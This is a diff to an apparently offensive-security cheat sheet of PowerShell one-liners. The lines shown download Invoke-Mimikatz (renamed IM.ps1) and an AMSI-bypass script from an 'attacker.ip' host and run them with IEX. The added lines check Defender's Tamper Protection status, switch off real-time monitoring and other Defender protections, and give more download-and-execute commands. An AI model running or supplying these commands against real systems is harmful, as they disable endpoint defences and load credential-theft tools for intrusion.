@@ -24,9 +24,32 @@ $g=$f.SetValue($null,$true)
 	- add download code for these scripts at the end of ASBB.ps1
 	- example for `Invoke-Mimikatz.ps1` which is renamed to `IM.ps1`
 ```powershell
-(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip7/IM.ps1') | IEX
+(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip/IM.ps1') | IEX
 ```
 - Download example
 ```powershell
 iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip/ASBB.ps1')”
 ```
+
+- Tamper Protection status:
+	- If the output is `False`, Tamper Protection is enabled.
+	-  If the output is `True`, Tamper Protection is disabled.
+```powershell
+(Get-MpPreference).DisableTamperProtection
+```
+
+- Disable Defender if Tamper Protection is off
+```powershell
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
+```
+
+- Download and execute Powershell script
+
+```powershell
+ iex (New-Object Net.WebClient).DownloadString('http://ipaddress/script.ps1')
+```
+
+```powershell
+Invoke-Expression -Command (Invoke-WebRequest -Uri 'http://ipaddress/script.ps1').Content
+```
+
